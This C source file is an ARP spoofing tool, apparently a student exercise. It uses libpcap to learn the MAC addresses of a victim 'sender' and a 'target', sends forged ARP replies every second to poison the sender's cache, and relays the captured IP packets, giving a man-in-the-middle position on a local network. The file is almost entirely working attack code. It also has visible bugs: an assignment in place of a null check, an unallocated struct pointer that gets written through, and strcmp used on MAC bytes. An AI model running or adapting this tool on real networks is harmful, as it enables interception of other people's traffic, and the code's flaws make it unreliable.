#include <unistd.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>

struct netinfo{
	pcap_t* handle;
	uint8_t* my_mac;
	uint8_t* sender_mac;
	uint8_t* target_mac;
	uint8_t* my_ip;
	uint8_t* sender_ip;
	uint8_t* target_ip;
};

struct addr{
	uint8_t mac[6];
	uint8_t ip[4];
};

void printMAC(uint8_t* mac){
	for(int i=0;i<5;i++)printf("%02x:",mac[i]);
	printf("%02x\n",mac[5]);
}

void construct_eth(struct ether_header *eth,uint8_t* dst_mac,uint8_t* src_mac){
	memcpy(eth->ether_dhost,dst_mac,6);
	memcpy(eth->ether_shost,src_mac,6);
	eth->ether_type=ntohs(ETHERTYPE_ARP);
}

void construct_arp(struct ether_arp *arp,uint8_t* dst_mac,uint8_t* src_mac,char *dst_ip,char* src_ip,int opcode){
	arp->arp_hrd=htons(ARPHRD_ETHER);
	arp->arp_pro=htons(ETHERTYPE_IP);
	arp->arp_hln=ETHER_ADDR_LEN;
	arp->arp_pln=sizeof(in_addr_t);
	if(opcode)arp->arp_op=htons(ARPOP_REQUEST);
	else arp->arp_op=htons(ARPOP_REPLY);
	if(dst_mac!=NULL)memcpy(arp->arp_tha,dst_mac,6);
	else memset(arp->arp_tha,'\x00',6);
	memcpy(arp->arp_sha,src_mac,6);
	inet_aton(dst_ip,arp->arp_tpa);
	inet_aton(src_ip,arp->arp_spa);
}

uint8_t* combine(struct ether_header *eth,struct ether_arp *arp){
	uint8_t *frame=(uint8_t*)malloc(sizeof(struct ether_header)+sizeof(struct ether_arp));
	memset(frame,0x00,sizeof(struct ether_header)+sizeof(struct ether_arp));
	memcpy(frame,eth,sizeof(struct ether_header));
	memcpy(frame+sizeof(struct ether_header),arp,sizeof(struct ether_arp));
	return frame;
}

void get_othermac(uint8_t* mac,uint8_t* data,const char* ip,pcap_t* handle){
	const uint8_t* packet;
	int res;
	struct pcap_pkthdr* header;

	if(pcap_sendpacket(handle,data,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
		pcap_perror(handle,0);
		pcap_close(handle);
		exit(1);
	}
	while(1){
		res=pcap_next_ex(handle,&header,&packet);
		struct ether_header *etherneth;
		etherneth=(struct ether_header*)packet;
	
		if(ntohs(etherneth->ether_type)==ETHERTYPE_ARP){
			struct ether_arp *arph;
			arph=(struct ether_arp*)(packet+sizeof(struct ether_header));
			unsigned char buf[100];
				
			sprintf(buf,"%d.%d.%d.%d",arph->arp_spa[0],arph->arp_spa[1],arph->arp_spa[2],arph->arp_spa[3]);
			if(!strcmp(buf,ip)){
				printf("same with %s\n",ip);
				memcpy(mac,&packet[6],6);
				break;
			}
			printf("unsame with %s\n",ip);
		}
		if(res==0)continue;
		if(res==-1||res==-2)break;
	}
}

void *arp_infect_sender(void *data){
	struct netinfo* info=(struct netinfo*)data;
	struct ether_header fake_eth;
	struct ether_arp fake_arp;
	uint8_t* fake_frame;
	construct_eth(&fake_eth,info->sender_mac,info->my_mac);
	construct_arp(&fake_arp,info->sender_mac,info->my_mac,info->sender_ip,info->target_ip,0);
	fake_frame=combine(&fake_eth,&fake_arp);
	
	printf("arp infect start\n");
	while(1){
		if(pcap_sendpacket(info->handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
			pcap_perror(info->handle,0);
			pcap_close(info->handle);
			exit(1);
		}
		sleep(1);
	}
}

/*void *arp_infect_target(void *data){
	struct netinfo* info=(struct netinfo*)data;
	struct ether_header fake_eth;
	struct ether_arp fake_arp;
	uint8_t* fake_frame;
	construct_eth(&fake_eth,info->target_mac,info->my_mac);
	construct_arp(&fake_arp,info->target_mac,info->my_mac,info->target_ip,info->sender_ip,0);
	fake_frame=combine(&fake_eth,&fake_arp);
	
	printf("arp infect start\n");
	while(1){
		if(pcap_sendpacket(info->handle,fake_frame,sizeof(struct ether_header)+sizeof(struct ether_arp))==-1){
			pcap_perror(info->handle,0);
			pcap_close(info->handle);
			exit(1);
		}
		sleep(1);
	}
}*/


void *ip_forward(void *data){
	struct netinfo* info=(struct netinfo*)data;
	const uint8_t* packet;
	int res;
	struct pcap_pkthdr* header;

	while(1){
		res=pcap_next_ex(info->handle,&header,&packet);
		struct ether_header* eth;
	
		eth=(struct ether_header*)packet;
		
		//check dst mac is my_mac
		if(strcmp(eth->ether_dhost,info->my_mac))continue;

		//check ip packet
		if(ntohs(eth->ether_type)==ETHERTYPE_IP){
			struct ip* iph;
			
			iph=(struct ip*)(packet+sizeof(struct ether_header));
			if(iph->ip_p!=IPPROTO_IP)continue;	
			
			uint8_t* address=inet_ntoa(iph->ip_src);
			//check src ip
			if(strcmp(address,info->sender_ip))continue;

			uint8_t* fake_packet=(uint8_t*)malloc(100);
			memcpy(fake_packet,packet,100);
			eth=(struct ether_header*)fake_packet;
			memcpy(eth->ether_shost,info->my_mac,6);
			memcpy(eth->ether_dhost,info->target_mac,6);

			if(pcap_sendpacket(info->handle,fake_packet,100)==-1){
				pcap_perror(info->handle,0);
				pcap_close(info->handle);
				exit(1);
			}
		}
		if(res==0)continue;
		else if(res==-1||res==-2)break;
	}
}

void getmacaddr(struct addr *addr,const char* inf){
	int s;
	struct ifreq ifr;
	s=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);

	memset(&ifr,0,sizeof(ifr));
	snprintf(ifr.ifr_name,sizeof(ifr.ifr_name),"%s",inf);

	ioctl(s,SIOCGIFHWADDR,&ifr);
	close(s);

	memcpy(addr->mac,ifr.ifr_hwaddr.sa_data,6);
}

void getipaddr(struct addr *addr,const char* inf){
	int s;
	struct ifreq ifr;
	s=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);

	memset(&ifr,0,sizeof(ifr));
	ifr.ifr_addr.sa_family=AF_INET;
	snprintf(ifr.ifr_name,sizeof(ifr.ifr_name),"%s",inf);

	ioctl(s,SIOCGIFADDR,&ifr);
	close(s);
	
	memcpy(addr->ip,&(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr),4);
}

int main(int argc, char* argv[]){
	char* interface=argv[1];
	char* sender_ip=argv[2];
	char* target_ip=argv[3];
	uint8_t att[100];
	uint8_t *attacker_mac=(uint8_t*)malloc(6);
	uint8_t *sender_mac=(uint8_t*)malloc(6);
	uint8_t *target_mac=(uint8_t*)malloc(6);
	uint8_t *frame_sender,*fake_frame;
	struct ether_header eth,fake_eth;
	struct ether_arp arp_req,fake_arp;
	pthread_t thread[2];
	int status;
	int thread_id;
	struct addr address;

	printf("attacker mac : ");
	getmacaddr(&address,interface);
	attacker_mac=address.mac;
	printMAC(attacker_mac);

	printf("attacker ip : ");
	getipaddr(&address,interface);
	sprintf(att,"%d.%d.%d.%d",address.ip[0],address.ip[1],address.ip[2],address.ip[3]);
	printf("%s\n",att);

	//pcap_open
	pcap_t* handle;
	char* errbuf[PCAP_ERRBUF_SIZE];
	int res;
	
	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
	if(handle=NULL){
		fprintf(stderr,"couldn't open device %s:%s\n",interface,errbuf);
		exit(1);
	}

	//get sender mac
	memset(&eth,0x00,sizeof(struct ether_header));
	memset(&arp_req,0x00,sizeof(struct ether_arp));
	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",attacker_mac);
	construct_arp(&arp_req,NULL,attacker_mac,sender_ip,att,1);
	frame_sender=combine(&eth,&arp_req);
	printf("ds");
	get_othermac(sender_mac,frame_sender,sender_ip,handle);
	printf("sender mac : ");
	printMAC(sender_mac);

	//get target mac
	memset(&eth,0x00,sizeof(struct ether_header));
	memset(&arp_req,0x00,sizeof(struct ether_arp));
	construct_eth(&eth,"\xff\xff\xff\xff\xff\xff",attacker_mac);
	construct_arp(&arp_req,NULL,attacker_mac,target_ip,att,1);
	frame_sender=combine(&eth,&arp_req);
	get_othermac(target_mac,frame_sender,target_ip,handle);
	printf("target mac : ");
	printMAC(target_mac);

	//thread1_arp infect periodly

	struct netinfo *info;
	info->handle=handle;
	info->my_mac=attacker_mac;
	info->sender_mac=sender_mac;
	info->target_mac=target_mac;
	info->my_ip=att;
	info->sender_ip=sender_ip;
	info->target_ip=target_ip;

	thread_id=pthread_create(&thread[0],NULL,arp_infect_sender,(void*)info);
	if(thread_id < 0){
		printf("pthread create error\n");
		exit(1);
	}

	/*thread_id=pthread_create(&thread[1],NULL,arp_infect_target,(void*)info);
	if(thread_id < 0){
		printf("pthread create error\n");
	}*/

	thread_id=pthread_create(&thread[1],NULL,ip_forward,(void*)info);
	if(thread_id < 0){
		printf("pthread create error\n");
		exit(1);
	}

	pthread_join(thread[0],(void**)&status);
	pthread_join(thread[1],(void**)&status);

	pcap_close(handle);
	//close(fd);
	return 0;
	
}
